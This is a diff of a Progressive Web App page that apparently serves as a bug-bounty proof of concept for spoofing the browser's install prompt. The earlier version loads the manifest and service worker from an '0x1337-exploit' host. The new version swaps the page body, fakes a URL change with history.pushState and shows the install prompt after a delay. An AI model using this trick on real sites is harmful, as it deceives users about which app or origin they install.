@@ -4,46 +4,81 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My PWA App</title>
-    <link rel="manifest" href="https://0x1337-exploit.github.io/hosting/pwa/manifest.json">
+    <link rel="manifest" href="manifest.json">
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
         button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>Welcome to My PWA App v6</h1>
+    <h1>Welcome to My PWA App</h1>
     <p>This is a simple Progressive Web App with an install button.</p>
     <button id="installButton" style="display: none;">Install App</button>
+
     <script>
         let deferredPrompt; // Variable to store the beforeinstallprompt event
+
         // Listen for the beforeinstallprompt event
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault(); // Prevent the mini-info bar from appearing
             deferredPrompt = e; // Store the event for later use
             document.getElementById('installButton').style.display = 'block'; // Show the install button
         });
-        // Handle button click: show prompt synchronously, then delay redirect
-        document.getElementById('installButton').addEventListener('click', () => {
+
+        // Handle button click: Simulate redirect first, then delay and prompt
+        document.getElementById('installButton').addEventListener('click', async () => {
             if (deferredPrompt) {
-                // Open redirect in new tab immediately (preserves original window)
-                window.open('https://hackerone.com', '_blank');
-                
-                // Show prompt synchronously in original window
-                deferredPrompt.prompt();
-                deferredPrompt.userChoice.then((choiceResult) => {
-                    if (choiceResult.outcome === 'accepted') {
-                        console.log('User accepted the install prompt');
-                    } else {
-                        console.log('User dismissed the install prompt');
-                    }
-                    deferredPrompt = null;
-                });
+                // Step 1: Fetch the new page content
+                try {
+                    const response = await fetch('/newpage.html'); // Replace with your target URL
+                    if (!response.ok) throw new Error('Failed to fetch new page');
+                    const html = await response.text();
+
+                    // Step 2: Parse the new HTML and extract body content + scripts
+                    const parser = new DOMParser();
+                    const newDoc = parser.parseFromString(html, 'text/html');
+                    const newBodyContent = newDoc.body.innerHTML;
+
+                    // Step 3: Inject new body content (replaces current body)
+                    document.body.innerHTML = newBodyContent;
+
+                    // Step 4: Extract and execute any <script> tags from the new page (if needed)
+                    const scripts = newDoc.querySelectorAll('script');
+                    scripts.forEach(script => {
+                        const newScript = document.createElement('script');
+                        if (script.src) {
+                            newScript.src = script.src;
+                        } else {
+                            newScript.textContent = script.textContent;
+                        }
+                        document.head.appendChild(newScript);
+                    });
+
+                    // Step 5: Simulate URL change without reload
+                    history.pushState({}, '', '/newpage.html'); // Matches the fetched URL
+
+                    // Now the "redirect" is done, delay and show prompt
+                    setTimeout(() => {
+                        deferredPrompt.prompt(); // Show the install prompt after delay
+                        deferredPrompt.userChoice.then((choiceResult) => {
+                            if (choiceResult.outcome === 'accepted') {
+                                console.log('User accepted the install prompt');
+                            } else {
+                                console.log('User dismissed the install prompt');
+                            }
+                            deferredPrompt = null; // Reset the prompt
+                        });
+                    }, 3000); // 3-second delay
+                } catch (error) {
+                    console.error('Simulated redirect failed:', error);
+                }
             }
         });
+
         // Register the service worker
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
-                navigator.serviceWorker.register('https://0x1337-exploit.github.io/hosting/pwa/sw.js')
+                navigator.serviceWorker.register('/sw.js')
                     .then(reg => console.log('Service Worker registered', reg))
                     .catch(err => console.log('Service Worker registration failed', err));
             });
